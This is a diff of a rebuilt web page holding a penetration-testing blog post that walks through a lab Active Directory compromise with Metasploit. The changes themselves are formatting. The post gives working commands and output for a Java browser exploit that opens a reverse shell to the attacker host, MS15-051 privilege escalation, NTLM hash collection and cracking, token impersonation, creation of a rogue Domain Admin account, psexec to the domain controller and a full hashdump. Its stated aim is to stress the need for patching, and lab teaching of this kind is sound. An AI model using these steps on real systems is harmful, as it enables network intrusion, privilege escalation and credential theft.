@@ -2,16 +2,6 @@
 <html>
   <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?">
   <head>
-  <script>
-  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-
-  ga('create', 'UA-82489724-1', 'auto');
-  ga('send', 'pageview');
-
-  </script>
   <meta name="google-site-verification" content="2sf0nOsdmxOwb35mzYgNoZLo3dWw5VuhtdWLaSGSekA" />
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -21,9 +11,8 @@
   <meta name="description" content="The main aim of this article is to show how much it is important to keep systems up to date with the latest Security patches; in particular, this post is abo...">
 
   <link rel="stylesheet" href="/css/main.css">
-  <link rel="canonical" href="https://spreadsecurity.github.io//2016/11/17/attack-simulation-from-no-access-to-domain-admin.html">
-  <link rel="alternate" type="application/rss+xml" title="Spread Security" href="https://spreadsecurity.github.io//feed.xml">
-</head>
+  <link rel="canonical" href="http://0.0.0.0:4000/2016/11/17/attack-simulation-from-no-access-to-domain-admin.html">
+ </head>
 
   <body>
     <nav class="single-post-nav">
@@ -43,7 +32,7 @@
     </nav>
     <div class="single-post">
       <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header class="post-header single-post-header" style="background-image:url('https://spreadsecurity.github.io//images/code_banner.jpg')">
+  <header class="post-header single-post-header" style="background-image:url('http://0.0.0.0:4000/images/code_banner.jpg')">
     <div>
       <h1 class="post-title single-post-title" itemprop="name headline">Attack Simulation: from No Access to Domain Admin</h1>
       <p class="post-meta single-post-meta">
@@ -114,24 +103,22 @@ On the Windows 7 machine it is installed an old version of Java Runtime Environm
 
 <p>We can begin by launching PostgreSQL service in order to use Metasploit database:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# service postgresql start
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# service postgresql start
+</code></pre></div></div>
 
 <p>Then we can power up Metasploit console:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# msfconsole -q
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# msfconsole -q
 msf &gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><strong>Java Client-side Exploitation</strong></p>
 
 <p>Among all the vulnerabilities affecting Java 6u23, we can use <em>Java storeImageArray() Invalid Array Indexing Vulnerability</em>. Through the <code class="highlighter-rouge">info</code> command we can take a look at the description that reports a lot of useful informations like the list of platforms affected, reliability Rank, vulnerability disclosure date, module authors, Common Vulnerability and Exposures (CVE) identifier and, of course, the options we need to set up to run the exploit:</p>
 
-<div class="language-console highlighter-rouge"><pre class="highlight"><code>msf &gt; use exploit/multi/browser/java_storeimagearray 
-msf exploit(java_storeimagearray) &gt; info
-
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msf &gt;</span><span class="w"> </span>use exploit/multi/browser/java_storeimagearray 
+<span class="gp">msf exploit(java_storeimagearray) &gt;</span><span class="w"> </span>info
+<span class="go">
        Name: Java storeImageArray() Invalid Array Indexing Vulnerability
      Module: exploit/multi/browser/java_storeimagearray
    Platform: Java, Linux, Windows
@@ -142,9 +129,9 @@ msf exploit(java_storeimagearray) &gt; info
 
 Provided by:
   Unknown
-  sinn3r &lt;sinn3r@metasploit.com&gt;
-  juan vazquez &lt;juan.vazquez@metasploit.com&gt;
-
+</span><span class="gp">  sinn3r &lt;sinn3r@metasploit.com&gt;</span><span class="w">
+</span><span class="gp">  juan vazquez &lt;juan.vazquez@metasploit.com&gt;</span><span class="w">
+</span><span class="go">
 Available targets:
   Id  Name
   --  ----
@@ -179,8 +166,7 @@ References:
   https://www.exploit-db.com/exploits/27526
   https://packetstormsecurity.com/files/122777
   http://hg.openjdk.java.net/jdk7u/jdk7u-dev/jdk/rev/2a9c79db0040
-</code></pre>
-</div>
+</span></code></pre></div></div>
 
 <p>This kind of exploits starts a webserver and hosts the malicious code on a webpage, so, when the victim visits the url, it executes.<br />
 Looking at the options, we have to set up the TARGET system, which is Windows, and the URIPATH that represents the last part of the malicious url address.<br />
@@ -190,7 +176,7 @@ Moreover, we need to set the PAYLOAD type, which represents the program we can e
 
 <p>Once the payload is selected, we set up the IP address (LHOST) and the port (LPORT) to which we want the victim machine connects back to (in this case our host):</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf exploit(java_storeimagearray) &gt; set target 1
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(java_storeimagearray) &gt; set target 1
 target =&gt; 1
 msf exploit(java_storeimagearray) &gt; set uripath /
 uripath =&gt; /
@@ -227,19 +213,17 @@ Exploit target:
    Id  Name
    --  ----
    1   Windows Universal
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>With everything properly configured we can launch the exploit as a background job:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf exploit(java_storeimagearray) &gt; exploit -j
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(java_storeimagearray) &gt; exploit -j
 [*] Exploit running as background job.
 [*] Started reverse TCP handler on 192.168.1.10:443 
 [*] Using URL: http://0.0.0.0:8080/
 [*] Local IP: http://192.168.1.10:8080/
 [*] Server started.
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><strong>Social Engineering</strong></p>
 
@@ -249,22 +233,20 @@ Exploit target:
 
 <p>So, when the victim visits the webpage the Java exploit executes and the attacker obtains a remote connection, i.e., a meterpreter session on the victim machine:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>[*] Sending HTML...
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Sending HTML...
 [*] Sending .jar file...
 [*] Sending .jar file...
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p class="center"><a href="/images/active_directory/java_exploit.png"><img src="/images/active_directory/java_exploit.png" alt="" /></a></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>[*] Sending stage (957999 bytes) to 192.168.1.208
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Sending stage (957999 bytes) to 192.168.1.208
 [*] Meterpreter session 1 opened (192.168.1.10:443 -&gt; 192.168.1.208:49163) at 2016-11-16 20:29:32 +0200
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>We can then verify the connection by checking active sessions:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf exploit(java_storeimagearray) &gt; sessions -l
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(java_storeimagearray) &gt; sessions -l
 
 Active sessions
 ===============
@@ -272,8 +254,7 @@ Active sessions
   Id  Type                   Information                Connection
   --  ----                   -----------                ----------
   1   meterpreter x86/win32  NET\testuser1 @ WIN7SP164  192.168.1.10:443 -&gt; 192.168.1.208:49163 (192.168.1.208) 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>We have an established connection between the attacker machine with IP address 192.168.1.10 and the victim machine with IP address 192.168.1.208; this connection starts from the victim machine and connects back to the attacker one using port 443. Choosing this port was not random: a connection of this type will be less suspicious since it mimics an ordinary SSL session like if the user is just visiting a webpage in HTTPS.<br />
 Beware that this exploit works both on Internet Explorer (version 8 in this test) and Mozilla Firefox (of course Java plugin must be active).</p>
@@ -282,7 +263,7 @@ Beware that this exploit works both on Internet Explorer (version 8 in this test
 
 <p>Starting the interaction we may want to acquire system informations, like architecture, domain name, user ID and so on; <code class="highlighter-rouge">sysinfo</code> command is what we need:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf exploit(java_storeimagearray) &gt; sessions -i 1 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(java_storeimagearray) &gt; sessions -i 1 
 [*] Starting interaction with 1...
 meterpreter &gt; sysinfo 
 Computer        : WIN7SP164
@@ -294,15 +275,14 @@ Logged On Users : 2
 Meterpreter     : x86/win32
 meterpreter &gt; getuid 
 Server username: NET\testuser1
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>We see that we are controlling a Windows 7 machine and the meterpreter is running inside a process owned by the user “testuser1” which is registered to the domain NET.<br />
 Another interesting information is given by system architecture that is 64-bit while the meterpreter is x86, i.e it is running on a 32-bit process: this means we have to migrate to a 64-bit process in order to use the meterpreter properly.</p>
 
 <p>Before doing that, we can gather additional informations using Metasploit post exploitation modules. For example, it would be useful to know what kind of privileges the current user has got, like being in the Local Administrators group:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; background 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; background 
 [*] Backgrounding session 1...
 msf post(java_storeimagearray) &gt; use post/windows/gather/win_privs 
 msf post(win_privs) &gt; info
@@ -355,14 +335,13 @@ Windows Privileges
  SeUndockPrivilege
 
 [*] Post module execution completed
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>As reported the user has not Administration privileges, which means bad news for the attacker: in fact, a good Security practice is to set policies for employers workstations in such a way they do not have local Administrative privileges on their own machine (of course this has also to be followed by the application of Security patches as we will see afterwards).</p>
 
 <p>Another smart move could be to acquire the IP address of the Domain Controller:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf post(win_privs) &gt; use post/windows/gather/enum_domain
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf post(win_privs) &gt; use post/windows/gather/enum_domain
 msf post(enum_domain) &gt; info
 
        Name: Windows Gather Enumerate Domain
@@ -391,12 +370,11 @@ msf post(enum_domain) &gt; exploit
 [+] FOUND Domain: net
 [+] FOUND Domain Controller: DC (IP: 192.168.1.200)
 [*] Post module execution completed
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Enumerating Domain Admin accounts is for sure a good idea since they are interesting targets due to their privileges:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf exploit(enum_domain) &gt; use post/windows/gather/enum_domain_group_users 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(enum_domain) &gt; use post/windows/gather/enum_domain_group_users 
 msf post(enum_domain_group_users) &gt; info
 
        Name: Windows Gather Enumerate Domain Group
@@ -434,15 +412,14 @@ msf post(enum_domain_group_users) &gt; exploit
 [*] Current session running as NET\testuser1 is not a member of domain admins
 [*] User list stored in /root/.msf4/loot/20160906195451_default_192.168.1.208_domain.group.mem_774905.txt
 [*] Post module execution completed
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>The results are telling us that we have only one Domain Admin user: “boss”. Remember this account, because it will be useful later.<br />
 Keep in mind that we could have gathered these informations also by dropping the meterpreter session to a Windows command shell: for example, to find the list of Domain Admins users the command would be <code class="highlighter-rouge">net groups "domain admins" /domain</code>.</p>
 
 <p>Going back to the 32/64-bit architecture topic, we need to migrate the meterpreter to a 64-bit process: for this purpose we can list all the processes running on the machine and choose a 64-bit one:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; ps
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; ps
 
 Process List
 ============
@@ -485,13 +462,12 @@ Process List
  2188  620   WmiPrvSE.exe                                     
  2376  488   svchost.exe                                      
  2740  488   SearchIndexer.exe 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Note the process with PID 1992 associated to the “.exe” payload file located in the Temp directory: this is the one the meterpreter is currently running on.<br />
 Generally, migrating to “explorer.exe” is a good choice, so we use its PID as parameter to the <code class="highlighter-rouge">migrate</code> command:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; migrate 1708
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; migrate 1708
 [*] Migrating from 1992 to 1708...
 [*] Migration completed successfully.
 meterpreter &gt; sysinfo 
@@ -502,15 +478,14 @@ System Language : en_US
 Domain          : NET
 Logged On Users : 2
 Meterpreter     : x64/win64
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><strong>Privilege Escalation</strong></p>
 
 <p>The main concern now is that, even if we are able to read and write files inside the contest of the current user “testuser1”, we want to acquire a privileged access to the machine, i.e. we want to gain Administrator rights.<br />
 For this purpose we can analyze what Security patches are installed on the system in order to find if there are unpatched privilege escalation vulnerabilities. By doing this we can drop down to a Windows command shell and use the “wmic” utility:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; shell
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; shell
 Process 1880 created.
 Channel 1 created.
 Microsoft Windows [Version 6.1.7601]
@@ -526,13 +501,12 @@ C:\Windows\system32&gt;^C
 Terminate channel 1? [y/N]  y
 meterpreter &gt; background 
 [*] Backgrounding session 1...
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>The output shows clearly that in this company Windows System Administrators are not frequently updating clients workstations.<br />
 For example, we have discovered that the KB to the MS15-051 vulnerability is missing, so we can exploit it. This vulnerability affects Windows Kernel-Mode drivers allowing RCE, so it is possible to perform a Local Privilege Escalation, i.e. we can elevate the rights of our meterpreter session, which runs with “testuser1” privileges, to NT AUTHORITY\SYSTEM:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf exploit(java_storeimagearray) &gt; use exploit/windows/local/ms15_051_client_copy_image 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(java_storeimagearray) &gt; use exploit/windows/local/ms15_051_client_copy_image 
 msf exploit(ms15_051_client_copy_image) &gt; info
 
        Name: Windows ClientCopyImage Win32k Exploit
@@ -574,12 +548,11 @@ References:
   https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html
   https://github.com/hfiref0x/CVE-2015-1701
   https://technet.microsoft.com/library/security/MS15-051
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>To run this module we just need to set the session on which we want to run the module on and the payload type:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf exploit(ms15_051_client_copy_image) &gt; set session 1 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(ms15_051_client_copy_image) &gt; set session 1 
 session =&gt; 1
 msf exploit(ms15_051_client_copy_image) &gt; set target 1
 target =&gt; 1
@@ -622,12 +595,11 @@ msf exploit(ms15_051_client_copy_image) &gt; exploit
 [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
 [*] Sending stage (1189423 bytes) to 192.168.1.208
 [*] Meterpreter session 2 opened (192.168.1.10:4444 -&gt; 192.168.1.208:49164) at 2016-11-16 20:45:29 +0200
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>The newly created session has elevated privileges:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; getuid 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; getuid 
 Server username: NT AUTHORITY\SYSTEM
 meterpreter &gt; background 
 [*] Backgrounding session 2...
@@ -641,12 +613,11 @@ Active sessions
   1   meterpreter x64/win64  NET\testuser1 @ WIN7SP164        192.168.1.10:443 -&gt; 192.168.1.208:49326 (192.168.1.208)
   2   meterpreter x64/win64  NT AUTHORITY\SYSTEM @ WIN7SP164  192.168.1.10:4444 -&gt; 192.168.1.208:49327 (192.168.1.208)
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>This means now we have full control on the compromised system, like having access to the local stored credentials:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf exploit(ms15_051_client_copy_image) &gt; use post/windows/gather/credentials/credential_collector 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(ms15_051_client_copy_image) &gt; use post/windows/gather/credentials/credential_collector 
 msf post(credential_collector) &gt; info
 
        Name: Windows Gather Credential Collector
@@ -682,12 +653,11 @@ msf post(credential_collector) &gt; exploit
     NT AUTHORITY\SYSTEM
     NT AUTHORITY\ANONYMOUS LOGON
     [*] Post module execution completed
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>This module stores gathered credential in Metasploit database so it is possible to display them with a simple command:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf post(credential_collector) &gt; creds
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf post(credential_collector) &gt; creds
 Credentials
 ===========
 
@@ -696,8 +666,7 @@ host           origin         service        public         private             
 192.168.1.208  192.168.1.208  445/tcp (smb)  Administrator  aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef         NTLM hash
 192.168.1.208  192.168.1.208  445/tcp (smb)  Guest          aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash
 192.168.1.208  192.168.1.208  445/tcp (smb)  test           aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c         NTLM hash
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><strong>NTLM hash cracking</strong></p>
 
@@ -713,14 +682,13 @@ The second part represents the NT LAN Manager (NTLM) hash: NTLM is the successor
 
 <p>We are interested in the Administrator account, so we start by saving its details, i.e. username and corresponding NTLM hash, in a text file:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# cat hashes.txt 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# cat hashes.txt 
 Administrator:5835048ce94ad0564e29a924a03510ef
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Then we can launch the tool by specifying the hashes format and the dictionary file we want to use to crack the hashes (“rockyou” wordlist is included by default in Kali Linux inside <code class="highlighter-rouge">/usr/share/wordlists</code> folder):</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# john --format=NT --wordlist=/root/dictionary/rockyou.txt hashes.txt
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# john --format=NT --wordlist=/root/dictionary/rockyou.txt hashes.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (NT [MD4 128/128 SSE2 4x3])
 Press 'q' or Ctrl-C to abort, almost any other key for status
@@ -728,8 +696,7 @@ password1        (Administrator)
 1g 0:00:00:00 DONE (2016-09-03 23:09) 25.00g/s 900.0p/s 900.0c/s 900.0C/s tigger..liverpool
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>JTR has successfully found the password for the Administrator account: “password1”.
 Considering the worst case for the attacker, we suppose that the local Administrator password is different in every client belonging to the domain (otherwise he would already had access to every machine without performing any further action).</p>
@@ -742,7 +709,7 @@ In Windows, everytime a user tries to log in, the system verifies that user’s 
 <p>If a user connect to the compromised machine, it is possible to steal its relative token. This task can be performed with a Metasploit extension called Incognito.<br />
 Taking a look at the output of the “credential_collector” module used before, we see there are reported also informations about tokens. Now, supposing a Domain Admin logs on the controlled machine, we should see a delegation token for that user from the <code class="highlighter-rouge">list_tokens</code> command part of Incognito extension:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf exploit(credential_collector) &gt; sessions -i 2
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(credential_collector) &gt; sessions -i 2
 [*] Starting interaction with 2...
 
 meterpreter &gt; load incognito 
@@ -761,12 +728,11 @@ NT AUTHORITY\SYSTEM
 Impersonation Tokens Available
 ========================================
 NT AUTHORITY\ANONYMOUS LOGON
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>A new delegation token appears for the user “boss”, which is, as enumerated before, a Domain Admin. We can try to impersonate that token to acquire user privileges:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; impersonate_token
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; impersonate_token
 Usage: impersonate_token &lt;token&gt;
 
 Instructs the meterpreter thread to impersonate the specified token. All other actions will then be made in the context of that token.
@@ -777,12 +743,11 @@ Hint: Enclose with quotation marks if name contains a space
 meterpreter &gt; impersonate_token NET\\boss
 [+] Delegation token available
 [+] Successfully impersonated user NET\boss
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>A successful impersonation message is returned. Dropping down to a Windows shell we can check our identification:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; shell
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; shell
 Process 888 created.
 Channel 1 created.
 Microsoft Windows [Version 6.1.7601]
@@ -791,33 +756,30 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Windows\system32&gt;whoami
 whoami
 net\boss
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Impersonating a Domain Admin gives the rights to do pretty much whatever we want; for example we can add users to AD:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>C:\Windows\system32&gt;net user evilboss password123 /add /domain
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt;net user evilboss password123 /add /domain
 net user evilboss password123 /add /domain
 The request will be processed at a domain controller for domain net.testlab.
 
 The command completed successfully.
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>In particular, we can give Domain Admin rights to the just created user “evilboss”:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>C:\Windows\system32&gt;net group "Domain Admins" evilboss /add /domain
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt;net group "Domain Admins" evilboss /add /domain
 net group "Domain Admins" evilboss /add /domain
 The request will be processed at a domain controller for domain net.testlab.
 
 The command completed successfully.
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Now we have our own Domain Admin user through which we have administrative access to every machine registered to the Domain; that said, a good target is represented by the Domain Controller which stores all domain users NTLM hashes.
 To log on the DC we can use the “psexec” module:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>C:\Windows\system32&gt;^C
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt;^C
 Terminate channel 1? [y/N]  y
 meterpreter &gt; background 
 [*] Backgrounding session 2...
@@ -874,12 +836,11 @@ References:
   http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx
   http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access
   http://sourceforge.net/projects/smbexec/
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>This module takes as inputs the Domain name, a valid administrator username and password (no matter if plain text or hashed) and the destination host we want to log in. It connects to the Samba share specified on the target machine.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>msf exploit(psexec) &gt; set target 1
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(psexec) &gt; set target 1
 target =&gt; 1
 msf exploit(psexec) &gt; set rhost 192.168.1.200
 rhost =&gt; 192.168.1.200
@@ -924,12 +885,11 @@ System Language : en_US
 Domain          : NET
 Logged On Users : 5
 Meterpreter     : x64/win64
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Finally we can dump all the credentials stored on the Domain Controller:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; hashdump 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; hashdump 
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:4b08728132d41e230b4ee268c5b42acb:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43a6a9669d444da03408e368b8daf0c1:::
@@ -943,8 +903,7 @@ WIN7SP0$:1107:aad3b435b51404eeaad3b435b51404ee:77b40b8cb3d6c4547ab3442ff3a34683:
 WIN7SP1$:1115:aad3b435b51404eeaad3b435b51404ee:b31785870dd8c4df04ff8f48dd0b9728:::
 WINXPSP2$:1116:aad3b435b51404eeaad3b435b51404ee:61083f3aff10e03cc6ece1b04c9a76f1:::
 WIN7SP164$:1117:aad3b435b51404eeaad3b435b51404ee:031b3d01c20cb5f1ad6cceb4bccbd0ca:::
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Similarly to what we did for Local Administrator password, we can use JTR to crack this NTLM hashes.</p>
 
@@ -981,7 +940,7 @@ WIN7SP164$:1117:aad3b435b51404eeaad3b435b51404ee:031b3d01c20cb5f1ad6cceb4bccbd0c
   <div class="wrapper">
 
     <div class="footer-col-wrapper">
-        <p align=right>© 2016-2018 Spread Security | All Rights Reserved 
+        <p align=right>© 2016-2022 Spread Security | All Rights Reserved 
 </p>
     </div>
 
